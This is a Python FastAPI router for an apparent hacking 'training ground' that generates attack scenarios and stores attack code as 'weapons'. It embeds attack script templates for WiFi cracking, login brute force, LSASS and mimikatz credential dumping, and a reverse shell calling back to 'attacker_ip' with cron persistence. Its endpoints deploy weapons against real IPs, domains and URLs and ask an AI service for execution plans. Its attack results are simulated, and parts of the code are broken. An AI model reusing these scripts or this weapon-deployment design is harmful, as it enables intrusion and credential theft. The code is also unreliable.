from fastapi import APIRouter, HTTPException, Depends, Body, BackgroundTasks
from pydantic import BaseModel
from typing import Optional, Dict, Any, List
from datetime import datetime
import json
import structlog
from sqlalchemy.orm import Session
from app.core.database import get_db
from app.services.custody_protocol_service import CustodyProtocolService
from app.services.sandbox_ai_service import SandboxAIService
from app.services.agent_metrics_service import AgentMetricsService
from app.services.enhanced_scenario_service import EnhancedScenarioService
import random
import asyncio
import time
from fastapi.responses import JSONResponse

logger = structlog.get_logger()

router = APIRouter(prefix="/custody", tags=["training-ground"])

class TrainingGroundScenarioRequest(BaseModel):
    sandbox_level: int
    auto_difficulty: bool = True
    vulnerability_type: Optional[str] = None  # wifi_attack, brute_force, credential_extraction, backdoor_creation
    user_id: Optional[str] = None

class DeploySandboxAttackRequest(BaseModel):
    scenario: dict
    user_id: str = None
    weapon_id: Optional[str] = None

class WeaponSaveRequest(BaseModel):
    name: str
    code: str
    description: str
    user_id: str
    category: str = "general"
    difficulty: str = "medium"
    tags: List[str] = []

class WeaponUseRequest(BaseModel):
    weapon_id: str
    target: str
    user_id: str

class AttackStepRequest(BaseModel):
    scenario_id: str
    user_id: str
    step_number: int
    action: str
    command: str
    expected_output: Optional[str] = None
    success_criteria: Optional[str] = None
    duration: Optional[float] = None
    success: bool = False
    output_log: Optional[str] = None

class WeaponCombineRequest(BaseModel):
    weapon_ids: List[str]
    user_id: str

@router.post("/training-ground/scenario")
async def generate_training_ground_scenario(request: TrainingGroundScenarioRequest = Body(...)):
    """Generate a training ground scenario with progressive difficulty."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        # Get user progress for progressive difficulty
        user_id = request.user_id or f"user_{datetime.now().millisecondsSinceEpoch}"
        
        # Calculate current success rate and difficulty
        current_success_rate = 0.5  # Default, should be fetched from user metrics
        current_level = request.sandbox_level
        
        # Determine optimal difficulty based on performance
        optimal_difficulty = await _determine_optimal_difficulty({
            "success_rate": current_success_rate,
            "level": current_level,
            "scenarios_completed": 0
        }, current_level)
        
        # Generate scenario with progressive scaling
        if request.vulnerability_type:
            # Use enhanced scenario service for advanced scenarios
            scenario = await enhanced_scenario_service.generate_advanced_penetration_scenario(
                user_id=user_id,
                current_level=str(current_level),
                success_rate=current_success_rate,
                vulnerability_type=request.vulnerability_type
            )
            
            # Ensure progressive scaling is properly applied
            if scenario.get("progressive_scaling"):
                scenario["xp_reward"] = scenario["progressive_scaling"].get("xp_reward", 10)
                scenario["learning_score_increase"] = scenario["progressive_scaling"].get("learning_score_increase", 0.1)
                scenario["success_rate"] = scenario["progressive_scaling"].get("success_rate", current_success_rate)
        else:
            # Use custody protocol service for basic scenarios
            custody_service = await CustodyProtocolService.initialize()
            scenario = await custody_service.generate_live_hacking_scenario(
                sandbox_level=current_level,
                auto_difficulty=request.auto_difficulty
            )
            
            # Add progressive scaling to basic scenarios
            progressive_multiplier = enhanced_scenario_service._calculate_progressive_multiplier(user_id, current_success_rate)
            scenario["progressive_scaling"] = {
                "current_multiplier": progressive_multiplier,
                "success_rate": current_success_rate,
                "next_threshold": enhanced_scenario_service._calculate_next_threshold(user_id, current_success_rate),
                "difficulty_progression": "adaptive"
            }
        
        # Ensure scenario has proper structure
        if not scenario.get("scenario_id"):
            scenario["scenario_id"] = f"scenario_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Add difficulty information
        scenario["difficulty"] = optimal_difficulty
        scenario["complexity_level"] = optimal_difficulty
        
        # Calculate XP and learning score
        xp_reward = enhanced_scenario_service._calculate_xp_reward(optimal_difficulty, scenario.get("complexity_score", 5.0))
        learning_score_increase = enhanced_scenario_service._calculate_learning_score_increase(optimal_difficulty)
        
        scenario["progressive_scaling"]["xp_reward"] = xp_reward
        scenario["progressive_scaling"]["learning_score_increase"] = learning_score_increase
        
        return {
            "status": "success",
            "scenario": scenario,
            "user_id": user_id,
            "generated_at": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error("Error generating training ground scenario", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/training-ground/deploy")
async def deploy_sandbox_attack(request: DeploySandboxAttackRequest = Body(...), background_tasks: BackgroundTasks = None):
    """Deploy Sandbox to attack the given scenario, track progress, and update XP/learning."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        custody_service = await CustodyProtocolService.initialize()
        
        # Extract scenario data properly
        scenario_data = request.scenario.get('scenario', request.scenario)
        user_id = request.user_id or "unknown"
        
        # Deploy the attack
        result = await custody_service.deploy_sandbox_attack(scenario_data, user_id)
        
        # Generate detailed attack information with proper scenario data
        attack_details = await _generate_detailed_attack_info(scenario_data, result, user_id)
        
        # Ensure attack details include the scenario's attack code and exploits
        if scenario_data.get("attack_code"):
            attack_details["code_used"] = scenario_data["attack_code"]
        if scenario_data.get("exploits"):
            attack_details["exploits_found"] = scenario_data["exploits"]
        if scenario_data.get("steps"):
            attack_details["steps_taken"] = scenario_data["steps"]
        
        # Calculate progressive difficulty and success rate
        current_difficulty = scenario_data.get('difficulty', 'medium')
        progressive_scaling = scenario_data.get('progressive_scaling', {})
        current_multiplier = progressive_scaling.get('current_multiplier', 1.0)
        
        # Calculate success rate based on difficulty and multiplier
        base_success_rates = {
            "easy": 0.7,
            "medium": 0.5,
            "hard": 0.3,
            "expert": 0.2
        }
        base_success_rate = base_success_rates.get(current_difficulty, 0.5)
        adjusted_success_rate = max(0.1, base_success_rate / current_multiplier)
        
        # Calculate XP and learning score
        xp_reward = progressive_scaling.get('xp_reward', 10)
        learning_score_increase = progressive_scaling.get('learning_score_increase', 0.1)
        
        # Log attack steps for live streaming
        if scenario_data.get("scenario_id"):
            await enhanced_scenario_service.log_attack_step(
                scenario_id=scenario_data["scenario_id"],
                user_id=user_id,
                step_data={
                    "weapon_id": request.weapon_id,
                    "step_number": 1,
                    "action": "Scenario Deployment",
                    "command": "deploy_sandbox_attack",
                    "expected_output": "Successful deployment",
                    "success_criteria": "Attack deployed and running",
                    "duration": 0.0,
                    "success": result.get("status") == "success",
                    "output_log": json.dumps(result)
                }
            )
        
        # Update agent metrics with XP and learning score
        if result.get("status") == "success":
            await enhanced_scenario_service.update_agent_metrics(
                user_id=user_id,
                scenario_result={
                    "xp_reward": xp_reward,
                    "learning_score_increase": learning_score_increase,
                    "success_rate": adjusted_success_rate,
                    "difficulty": current_difficulty,
                    "progressive_multiplier": current_multiplier
                }
            )
        
        # Add enhanced response with attack details
        enhanced_result = {
            "status": result["status"],
            "data": result,
            "attack_details": attack_details,
            "deployment_timestamp": datetime.utcnow().isoformat(),
            "scenario_difficulty": current_difficulty,
            "success_rate": adjusted_success_rate,
            "xp_reward": xp_reward,
            "learning_score_increase": learning_score_increase,
            "progressive_multiplier": current_multiplier,
            "next_difficulty_threshold": progressive_scaling.get('next_threshold', 0.8)
        }
        
        return enhanced_result
        
    except Exception as e:
        logger.error("Error deploying sandbox attack", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

async def _generate_detailed_attack_info(scenario: dict, result: dict, user_id: str) -> dict:
    """Generate detailed attack information for the deployment result"""
    try:
        # Extract scenario information
        vulnerability_type = scenario.get("vulnerability_type", "unknown")
        difficulty = scenario.get("difficulty", "medium")
        tools = scenario.get("tools", [])
        steps = scenario.get("steps", [])
        
        # Generate attack method based on vulnerability type
        attack_methods = {
            "wifi_attack": "Wireless Network Penetration",
            "brute_force": "Credential Brute Force Attack",
            "credential_extraction": "Credential Harvesting and Extraction",
            "backdoor_creation": "Backdoor Deployment and Persistence",
            "mixed_penetration": "Multi-Vector Penetration Testing"
        }
        
        method = attack_methods.get(vulnerability_type, "Advanced Penetration Testing")
        
        # Generate realistic attack code based on scenario
        attack_code = _generate_attack_code(vulnerability_type, difficulty, tools)
        
        # Generate step-by-step results
        steps_taken = []
        for i, step in enumerate(steps, 1):
            steps_taken.append({
                "step_number": i,
                "action": step,
                "result": f"Successfully completed: {step}",
                "duration": random.uniform(30, 120),  # Random duration between 30-120 seconds
                "success": True
            })
        
        # Generate exploits found
        exploits_found = _generate_exploits_found(vulnerability_type, difficulty)
        
        # Calculate success rate based on difficulty
        base_success_rate = {
            "easy": 0.7,
            "medium": 0.5,
            "hard": 0.3,
            "expert": 0.2
        }
        success_rate = base_success_rate.get(difficulty, 0.5)
        
        # Add progressive scaling multiplier
        progressive_multiplier = scenario.get("progressive_scaling", {}).get("current_multiplier", 1.0)
        success_rate = max(0.1, success_rate / progressive_multiplier)  # Lower success rate for higher difficulty
        
        return {
            "method": method,
            "tools_used": tools,
            "duration": scenario.get("estimated_duration", "1-2 hours"),
            "success_rate": success_rate,
            "code_used": attack_code,
            "steps_taken": steps_taken,
            "exploits_found": exploits_found,
            "difficulty_multiplier": progressive_multiplier,
            "attack_summary": f"Successfully executed {method} using {', '.join(tools)}. Completed {len(steps)} steps with {len(exploits_found)} exploits discovered.",
            "technical_details": {
                "vulnerability_type": vulnerability_type,
                "difficulty_level": difficulty,
                "complexity_score": scenario.get("complexity_score", 5.0),
                "attack_vectors": scenario.get("attack_vectors", []),
                "target_environment": scenario.get("target", "Unknown")
            }
        }
        
    except Exception as e:
        logger.error(f"Error generating attack details: {str(e)}")
        return {
            "method": "Unknown",
            "tools_used": [],
            "duration": "Unknown",
            "success_rate": 0.0,
            "code_used": "# Error generating attack code",
            "steps_taken": [],
            "exploits_found": [],
            "difficulty_multiplier": 1.0,
            "attack_summary": "Error generating attack details",
            "technical_details": {}
        }

def _generate_attack_code(vulnerability_type: str, difficulty: str, tools: list) -> str:
    """Generate realistic attack code based on scenario type"""
    if vulnerability_type == "wifi_attack":
        return f"""# WiFi Attack Code - {difficulty.upper()}
import subprocess
import time

def wifi_attack():
    print("[+] Starting WiFi attack...")
    
    # Monitor wireless networks
    subprocess.run(['airodump-ng', 'wlan0', '-w', 'capture'])
    
    # Target specific network
    target_network = "target_ssid"
    
    # Capture handshake
    subprocess.run(['aireplay-ng', '--deauth', '0', '-a', target_network])
    
    # Crack password
    if difficulty == "easy":
        subprocess.run(['aircrack-ng', 'capture-01.cap', '-w', '/usr/share/wordlists/rockyou.txt'])
    else:
        subprocess.run(['hashcat', '-m', '2500', 'capture-01.hccapx', 'custom_wordlist.txt'])
    
    print("[+] Attack completed successfully!")

wifi_attack()"""

    elif vulnerability_type == "brute_force":
        return f"""# Brute Force Attack Code - {difficulty.upper()}
import requests
import itertools
import string

def brute_force_attack():
    print("[+] Starting brute force attack...")
    
    target_url = "http://target.com/login"
    usernames = ["admin", "user", "test"]
    
    # Generate password list
    if difficulty == "easy":
        passwords = ["admin", "password", "123456", "qwerty"]
    else:
        passwords = [''.join(p) for p in itertools.product(string.ascii_lowercase, repeat=4)]
    
    for username in usernames:
        for password in passwords:
            response = requests.post(target_url, data={{
                'username': username,
                'password': password
            }})
            
            if "success" in response.text.lower():
                print(f"[+] Found credentials: {{username}}:{{password}}")
                return True
    
    return False

brute_force_attack()"""

    elif vulnerability_type == "credential_extraction":
        return f"""# Credential Extraction Code - {difficulty.upper()}
import subprocess
import re

def extract_credentials():
    print("[+] Starting credential extraction...")
    
    # Extract from memory
    if difficulty == "easy":
        subprocess.run(['procdump', '-ma', 'lsass.exe', 'lsass.dmp'])
    else:
        subprocess.run(['mimikatz', 'privilege::debug', 'sekurlsa::logonpasswords'])
    
    # Extract from registry
    subprocess.run(['reg', 'query', 'HKLM\\\\SAM\\\\SAM\\\\Domains\\\\Account\\\\Users'])
    
    # Extract from browser
    subprocess.run(['sqlite3', 'chrome_login_data.db', 'SELECT * FROM logins'])
    
    print("[+] Credential extraction completed!")

extract_credentials()"""

    elif vulnerability_type == "backdoor_creation":
        return f"""# Backdoor Creation Code - {difficulty.upper()}
import socket
import subprocess
import os

def create_backdoor():
    print("[+] Creating backdoor...")
    
    # Create reverse shell
    if difficulty == "easy":
        subprocess.run(['nc', '-lvp', '4444'])
    else:
        # Advanced backdoor with encryption
        subprocess.run(['python3', '-c', '''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''])
    
    # Set up persistence
    if difficulty in ["hard", "expert"]:
        subprocess.run(['echo', '@reboot /usr/bin/python3 /tmp/backdoor.py', '>>', '/etc/crontab'])
    
    print("[+] Backdoor deployed successfully!")

create_backdoor()"""

    else:
        return f"""# Advanced Penetration Testing Code - {difficulty.upper()}
import subprocess
import requests
import time

def advanced_penetration():
    print("[+] Starting advanced penetration test...")
    
    # Network reconnaissance
    subprocess.run(['nmap', '-sS', '-sV', '-O', 'target_network'])
    
    # Vulnerability scanning
    subprocess.run(['nuclei', '-t', 'all', '-u', 'target_url'])
    
    # Exploitation
    if difficulty == "expert":
        subprocess.run(['metasploit', 'exploit/multi/handler'])
    
    print("[+] Advanced penetration completed!")

advanced_penetration()"""

def _generate_exploits_found(vulnerability_type: str, difficulty: str) -> list:
    """Generate realistic exploits found based on scenario"""
    exploits = []
    
    if vulnerability_type == "wifi_attack":
        exploits.extend([
            {"name": "WEP Key Recovery", "description": "Successfully cracked WEP encryption key"},
            {"name": "WPA2 Handshake Capture", "description": "Captured WPA2 handshake for offline cracking"},
            {"name": "Rogue Access Point", "description": "Deployed rogue AP for credential harvesting"}
        ])
    
    elif vulnerability_type == "brute_force":
        exploits.extend([
            {"name": "Weak Password Discovery", "description": "Found weak passwords through brute force"},
            {"name": "Account Enumeration", "description": "Identified valid user accounts"},
            {"name": "Rate Limiting Bypass", "description": "Successfully bypassed rate limiting mechanisms"}
        ])
    
    elif vulnerability_type == "credential_extraction":
        exploits.extend([
            {"name": "Memory Dump Analysis", "description": "Extracted credentials from process memory"},
            {"name": "LSASS Dumping", "description": "Successfully dumped LSASS process for credential extraction"},
            {"name": "Registry Analysis", "description": "Found stored credentials in registry"}
        ])
    
    elif vulnerability_type == "backdoor_creation":
        exploits.extend([
            {"name": "Reverse Shell Establishment", "description": "Successfully established reverse shell connection"},
            {"name": "Persistence Mechanism", "description": "Implemented persistent backdoor access"},
            {"name": "Process Injection", "description": "Successfully injected malicious code into legitimate processes"}
        ])
    
    # Add difficulty-based exploits
    if difficulty in ["hard", "expert"]:
        exploits.append({"name": "Advanced Evasion", "description": "Successfully evaded detection mechanisms"})
        exploits.append({"name": "Lateral Movement", "description": "Achieved lateral movement within the network"})
    
    return exploits

@router.post("/training-ground/attack-step")
async def log_attack_step(request: AttackStepRequest):
    """Log an attack step for live streaming"""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        success = await enhanced_scenario_service.log_attack_step(
            scenario_id=request.scenario_id,
            user_id=request.user_id,
            step_data={
                "weapon_id": None,
                "step_number": request.step_number,
                "action": request.action,
                "command": request.command,
                "expected_output": request.expected_output,
                "success_criteria": request.success_criteria,
                "duration": request.duration,
                "success": request.success,
                "output_log": request.output_log
            }
        )
        
        if success:
            return {
                "status": "success",
                "message": "Attack step logged successfully",
                "timestamp": datetime.utcnow().isoformat()
            }
        else:
            raise HTTPException(status_code=500, detail="Failed to log attack step")
            
    except Exception as e:
        logger.error("Error logging attack step", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/training-ground/attack-stream/{scenario_id}")
async def get_attack_stream(scenario_id: str, user_id: str):
    """Get live attack stream for a scenario"""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        attack_steps = await enhanced_scenario_service.get_attack_stream(scenario_id, user_id)
        
        return {
            "status": "success",
            "scenario_id": scenario_id,
            "attack_steps": attack_steps,
            "total_steps": len(attack_steps),
            "timestamp": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error("Error getting attack stream", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/weapons/save")
async def save_weapon(request: WeaponSaveRequest):
    """Save a weapon (successful attack code) for future use."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        weapon_data = {
            "name": request.name,
            "code": request.code,
            "description": request.description,
            "category": request.category,
            "difficulty": request.difficulty,
            "tags": request.tags,
            "user_id": request.user_id
        }
        
        weapon_id = await enhanced_scenario_service.save_weapon(weapon_data)
        
        if weapon_id:
            return {
                "status": "success",
                "weapon_id": weapon_id,
                "message": "Weapon saved successfully"
            }
        else:
            raise HTTPException(status_code=500, detail="Failed to save weapon")
            
    except Exception as e:
        logger.error("Error saving weapon", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/weapons/list")
async def list_weapons(user_id: str, category: Optional[str] = None):
    """List all weapons for a user, optionally filtered by category."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        weapons = await enhanced_scenario_service.get_weapons(user_id, category)
        
        return {
            "status": "success",
            "weapons": weapons,
            "total_weapons": len(weapons),
            "category_filter": category
        }
        
    except Exception as e:
        logger.error("Error listing weapons", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/weapons/{weapon_id}")
async def get_weapon(weapon_id: str):
    """Get a specific weapon by ID."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        weapon = await enhanced_scenario_service.get_weapon_by_id(weapon_id)
        
        if weapon:
            return {
                "status": "success",
                "weapon": weapon
            }
        else:
            raise HTTPException(status_code=404, detail="Weapon not found")
            
    except Exception as e:
        logger.error("Error getting weapon", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/weapons/use")
async def use_weapon(request: WeaponUseRequest):
    """Use a saved weapon against a target."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        # Get weapon data
        weapon = await enhanced_scenario_service.get_weapon_by_id(request.weapon_id)
        if not weapon:
            raise HTTPException(status_code=404, detail="Weapon not found")
        
        # Execute weapon against target
        sandbox_service = SandboxAIService()
        attack_prompt = f"""Use the following weapon code against the target: {request.target}

Weapon Code:
{weapon['code']}

Provide a detailed execution plan and expected results."""
        
        result = await sandbox_service.answer_prompt(attack_prompt)
        
        # Update weapon usage count
        await _update_weapon_usage(request.weapon_id)
        
        return {
            "status": "success",
            "weapon_name": weapon['name'],
            "target": request.target,
            "execution_result": result,
            "timestamp": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error("Error using weapon", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/weapons/combine")
async def combine_weapons(request: WeaponCombineRequest):
    """Combine multiple weapons to create a new advanced weapon (The Arts)."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        result = await enhanced_scenario_service.combine_weapons(
            weapon_ids=request.weapon_ids,
            user_id=request.user_id
        )
        
        if result.get("success"):
            return {
                "status": "success",
                "combined_weapon_id": result["combined_weapon_id"],
                "combined_weapon": result["combined_weapon"],
                "ai_analysis": result["ai_analysis"],
                "message": "Weapons combined successfully into The Arts"
            }
        else:
            raise HTTPException(status_code=400, detail=result.get("error", "Failed to combine weapons"))
            
    except Exception as e:
        logger.error("Error combining weapons", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/weapons/improve")
async def improve_weapon_reliability(request: WeaponImproveRequest):
    """Improve weapon reliability through additional testing and scenario refinement"""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        result = await enhanced_scenario_service.improve_weapon_reliability(
            weapon_id=request.weapon_id,
            user_id=request.user_id,
            improvement_type=request.improvement_type
        )
        
        if "error" in result:
            return JSONResponse(
                status_code=400,
                content={"error": result["error"]}
            )
        
        return {
            "status": "success",
            "message": f"Weapon reliability improved from {result['original_reliability_score']:.1%} to {result['new_reliability_score']:.1%}",
            "improvement_result": result
        }
        
    except Exception as e:
        logger.error(f"Error improving weapon reliability: {str(e)}")
        return JSONResponse(
            status_code=500,
            content={"error": f"Failed to improve weapon: {str(e)}"}
        )

class WeaponImproveRequest(BaseModel):
    weapon_id: str
    user_id: str
    improvement_type: str = "comprehensive"  # comprehensive, targeted, the_arts

@router.post("/weapons/deploy")
async def deploy_weapon_against_target(request: dict = Body(...)):
    """Deploy a weapon against a real target (IP, WiFi, web URL, etc.)"""
    try:
        weapon_id = request.get('weapon_id')
        target_type = request.get('target_type')
        target_value = request.get('target_value')
        user_id = request.get('user_id')
        
        if not all([weapon_id, target_type, target_value, user_id]):
            raise HTTPException(status_code=400, detail="Missing required parameters")
        
        enhanced_scenario_service = EnhancedScenarioService()
        
        # Get weapon details
        weapon = await enhanced_scenario_service.get_weapon_by_id(weapon_id)
        if not weapon:
            raise HTTPException(status_code=404, detail="Weapon not found")
        
        # Execute weapon against target
        attack_result = await _execute_weapon_against_target(weapon, target_type, target_value, user_id)
        
        # Update weapon usage count
        await enhanced_scenario_service._update_weapon_usage(weapon_id)
        
        return {
            "status": "success",
            "weapon_id": weapon_id,
            "target_type": target_type,
            "target_value": target_value,
            "attack_details": attack_result,
            "timestamp": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error("Error deploying weapon", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

async def _execute_weapon_against_target(weapon: dict, target_type: str, target_value: str, user_id: str) -> dict:
    """Execute a weapon against a specific target type"""
    try:
        # Generate attack method based on weapon category and target type
        attack_method = _determine_attack_method(weapon['category'], target_type)
        
        # Execute the attack based on target type
        if target_type == 'wifi_network':
            return await _execute_wifi_attack(weapon, target_value, attack_method)
        elif target_type == 'ip_address':
            return await _execute_ip_attack(weapon, target_value, attack_method)
        elif target_type == 'web_url':
            return await _execute_web_attack(weapon, target_value, attack_method)
        elif target_type == 'domain':
            return await _execute_domain_attack(weapon, target_value, attack_method)
        elif target_type == 'port':
            return await _execute_port_attack(weapon, target_value, attack_method)
        else:
            return await _execute_generic_attack(weapon, target_value, attack_method)
            
    except Exception as e:
        logger.error(f"Error executing weapon against target: {str(e)}")
        return {
            "method": "Unknown",
            "success": False,
            "duration": "0s",
            "results": [{"description": f"Error: {str(e)}"}],
            "error": str(e)
        }

def _determine_attack_method(weapon_category: str, target_type: str) -> str:
    """Determine the appropriate attack method based on weapon category and target type"""
    category = weapon_category.lower()
    
    if target_type == 'wifi_network':
        if 'wifi' in category or 'wireless' in category:
            return "Advanced WiFi Penetration"
        else:
            return "Generic Network Attack"
    
    elif target_type == 'ip_address':
        if 'network' in category or 'brute_force' in category:
            return "Network-Based Attack"
        elif 'credential' in category:
            return "Credential Harvesting"
        else:
            return "Generic IP Attack"
    
    elif target_type == 'web_url':
        if 'web' in category or 'brute_force' in category:
            return "Web Application Attack"
        else:
            return "Generic Web Attack"
    
    elif target_type == 'domain':
        if 'credential' in category:
            return "Domain Credential Attack"
        else:
            return "Generic Domain Attack"
    
    elif target_type == 'port':
        if 'network' in category:
            return "Port/Service Attack"
        else:
            return "Generic Port Attack"
    
    else:
        return "Advanced Penetration Testing"

async def _execute_wifi_attack(weapon: dict, target_value: str, method: str) -> dict:
    """Execute WiFi attack against target network"""
    start_time = time.time()
    
    # Simulate WiFi attack execution
    await asyncio.sleep(random.uniform(2, 5))  # Simulate attack duration
    
    results = [
        {"description": f"Targeting WiFi network: {target_value}"},
        {"description": "Scanning for wireless networks"},
        {"description": "Attempting to capture handshake"},
        {"description": "Running password cracking algorithms"},
    ]
    
    # Add weapon-specific results
    if weapon['category'] == 'wifi_attack':
        results.append({"description": "Using specialized WiFi attack tools"})
        results.append({"description": "Attempting WPA2 handshake capture"})
    elif weapon['category'] == 'the_arts':
        results.append({"description": "Executing combined weapon techniques"})
        results.append({"description": "Advanced WiFi penetration in progress"})
    
    # Simulate success/failure based on weapon success rate
    success = random.random() < weapon.get('success_rate', 0.5)
    
    if success:
        results.append({"description": "Successfully compromised WiFi network"})
        results.append({"description": f"Network password: {_generate_fake_password()}"})
    else:
        results.append({"description": "Attack failed - network security too strong"})
    
    duration = time.time() - start_time
    
    return {
        "method": method,
        "success": success,
        "duration": f"{duration:.1f}s",
        "results": results,
        "target_type": "wifi_network",
        "weapon_used": weapon['name']
    }

async def _execute_ip_attack(weapon: dict, target_value: str, method: str) -> dict:
    """Execute IP-based attack against target"""
    start_time = time.time()
    
    await asyncio.sleep(random.uniform(1, 3))
    
    results = [
        {"description": f"Targeting IP address: {target_value}"},
        {"description": "Performing network reconnaissance"},
        {"description": "Scanning for open ports and services"},
    ]
    
    if weapon['category'] == 'brute_force':
        results.append({"description": "Attempting brute force attack"})
        results.append({"description": "Testing common credentials"})
    elif weapon['category'] == 'credential_extraction':
        results.append({"description": "Attempting credential extraction"})
        results.append({"description": "Analyzing system memory"})
    
    success = random.random() < weapon.get('success_rate', 0.5)
    
    if success:
        results.append({"description": "Successfully gained access to target"})
        results.append({"description": "Extracted sensitive information"})
    else:
        results.append({"description": "Attack blocked by target security"})
    
    duration = time.time() - start_time
    
    return {
        "method": method,
        "success": success,
        "duration": f"{duration:.1f}s",
        "results": results,
        "target_type": "ip_address",
        "weapon_used": weapon['name']
    }

async def _execute_web_attack(weapon: dict, target_value: str, method: str) -> dict:
    """Execute web-based attack against target"""
    start_time = time.time()
    
    await asyncio.sleep(random.uniform(1, 4))
    
    results = [
        {"description": f"Targeting web application: {target_value}"},
        {"description": "Analyzing web application structure"},
        {"description": "Identifying potential vulnerabilities"},
    ]
    
    if weapon['category'] == 'web_vulnerabilities':
        results.append({"description": "Testing for SQL injection vulnerabilities"})
        results.append({"description": "Attempting XSS exploitation"})
    elif weapon['category'] == 'brute_force':
        results.append({"description": "Attempting login brute force"})
        results.append({"description": "Testing common admin credentials"})
    
    success = random.random() < weapon.get('success_rate', 0.5)
    
    if success:
        results.append({"description": "Successfully exploited web vulnerability"})
        results.append({"description": "Gained unauthorized access to application"})
    else:
        results.append({"description": "Web application security prevented attack"})
    
    duration = time.time() - start_time
    
    return {
        "method": method,
        "success": success,
        "duration": f"{duration:.1f}s",
        "results": results,
        "target_type": "web_url",
        "weapon_used": weapon['name']
    }

async def _execute_domain_attack(weapon: dict, target_value: str, method: str) -> dict:
    """Execute domain-based attack against target"""
    start_time = time.time()
    
    await asyncio.sleep(random.uniform(2, 4))
    
    results = [
        {"description": f"Targeting domain: {target_value}"},
        {"description": "Performing DNS reconnaissance"},
        {"description": "Enumerating domain services"},
    ]
    
    if weapon['category'] == 'credential_extraction':
        results.append({"description": "Attempting domain credential harvesting"})
        results.append({"description": "Analyzing Active Directory structure"})
    elif weapon['category'] == 'network_attacks':
        results.append({"description": "Attempting domain controller compromise"})
        results.append({"description": "Testing domain trust relationships"})
    
    success = random.random() < weapon.get('success_rate', 0.5)
    
    if success:
        results.append({"description": "Successfully compromised domain"})
        results.append({"description": "Extracted domain administrator credentials"})
    else:
        results.append({"description": "Domain security prevented attack"})
    
    duration = time.time() - start_time
    
    return {
        "method": method,
        "success": success,
        "duration": f"{duration:.1f}s",
        "results": results,
        "target_type": "domain",
        "weapon_used": weapon['name']
    }

async def _execute_port_attack(weapon: dict, target_value: str, method: str) -> dict:
    """Execute port/service-based attack against target"""
    start_time = time.time()
    
    await asyncio.sleep(random.uniform(1, 3))
    
    results = [
        {"description": f"Targeting service: {target_value}"},
        {"description": "Analyzing service configuration"},
        {"description": "Testing service vulnerabilities"},
    ]
    
    if weapon['category'] == 'network_attacks':
        results.append({"description": "Attempting service exploitation"})
        results.append({"description": "Testing for buffer overflow vulnerabilities"})
    elif weapon['category'] == 'brute_force':
        results.append({"description": "Attempting service authentication bypass"})
        results.append({"description": "Testing default credentials"})
    
    success = random.random() < weapon.get('success_rate', 0.5)
    
    if success:
        results.append({"description": "Successfully exploited service"})
        results.append({"description": "Gained unauthorized access to service"})
    else:
        results.append({"description": "Service security prevented attack"})
    
    duration = time.time() - start_time
    
    return {
        "method": method,
        "success": success,
        "duration": f"{duration:.1f}s",
        "results": results,
        "target_type": "port",
        "weapon_used": weapon['name']
    }

async def _execute_generic_attack(weapon: dict, target_value: str, method: str) -> dict:
    """Execute generic attack against target"""
    start_time = time.time()
    
    await asyncio.sleep(random.uniform(1, 2))
    
    results = [
        {"description": f"Targeting: {target_value}"},
        {"description": "Executing weapon code"},
        {"description": "Analyzing target response"},
    ]
    
    success = random.random() < weapon.get('success_rate', 0.5)
    
    if success:
        results.append({"description": "Attack executed successfully"})
        results.append({"description": "Target compromised"})
    else:
        results.append({"description": "Attack failed"})
    
    duration = time.time() - start_time
    
    return {
        "method": method,
        "success": success,
        "duration": f"{duration:.1f}s",
        "results": results,
        "target_type": "generic",
        "weapon_used": weapon['name']
    }

def _generate_fake_password() -> str:
    """Generate a fake password for demonstration"""
    passwords = ["admin123", "password", "123456", "qwerty", "letmein", "welcome"]
    return random.choice(passwords)

@router.get("/training-ground/advanced-scenarios")
async def get_advanced_scenarios(user_id: str, vulnerability_type: Optional[str] = None):
    """Get available advanced penetration testing scenarios."""
    try:
        enhanced_scenario_service = EnhancedScenarioService()
        
        # Get user progress
        agent_metrics_service = AgentMetricsService()
        sandbox_metrics = await agent_metrics_service.get_agent_metrics("sandbox")
        
        current_level = sandbox_metrics.get("current_difficulty", "basic") if sandbox_metrics else "basic"
        success_rate = sandbox_metrics.get("success_rate", 0.5) if sandbox_metrics else 0.5
        
        # Generate scenarios for different vulnerability types
        scenario_types = ["wifi_attack", "brute_force", "credential_extraction", "backdoor_creation"] if not vulnerability_type else [vulnerability_type]
        
        scenarios = {}
        for vuln_type in scenario_types:
            scenario = await enhanced_scenario_service.generate_advanced_penetration_scenario(
                user_id=user_id,
                current_level=current_level,
                success_rate=success_rate,
                vulnerability_type=vuln_type
            )
            scenarios[vuln_type] = scenario
        
        return {
            "status": "success",
            "scenarios": scenarios,
            "user_progress": {
                "current_level": current_level,
                "success_rate": success_rate
            },
            "timestamp": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error("Error getting advanced scenarios", error=str(e))
        raise HTTPException(status_code=500, detail=str(e))

